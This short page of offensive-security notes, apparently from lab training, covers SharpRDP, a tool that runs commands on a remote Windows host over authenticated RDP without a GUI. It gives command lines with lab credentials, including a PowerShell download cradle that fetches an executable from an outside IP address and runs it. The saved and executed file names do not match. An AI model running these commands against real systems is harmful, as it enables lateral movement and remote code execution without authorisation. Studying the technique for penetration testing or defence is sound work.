# headless RDP with SharpRDP

The RDP application (mstsc.exe) builds upon the terminal services library mstscax.dll. this library exposes interfaces to both scripts and compiled code through COM objects.&#x20;

## <mark style="color:red;">SharpRDP</mark>

{% embed url="https://github.com/0xthirteen/SharpRDP" %}

SharpRDP is a C# application that uses uses the non-scriptable interfaces exposed by `mstscax.dll` to perform authentication in the same way as `mstsc.exe`. Once authentication is performed, SharpRDP allows us to execute code through `SendKeys`. In this manner, no GUI access is required and setting up a reverse tunnel is unnecessary.

```
SharpRDP.exe computername=appsrv01 command=notepad username=corp1\dave password=lab
```

Executing a PowerShell download cradle on remote system:

```
sharprdp.exe computername=client2 command="powershell (New-Object
System.Net.WebClient).DownloadFile('http://192.168.119.120/rev.exe',
'C:\Windows\Tasks\rev.exe'); C:\Windows\Tasks\met.exe" username=client1\dave
password=passwd.123
```
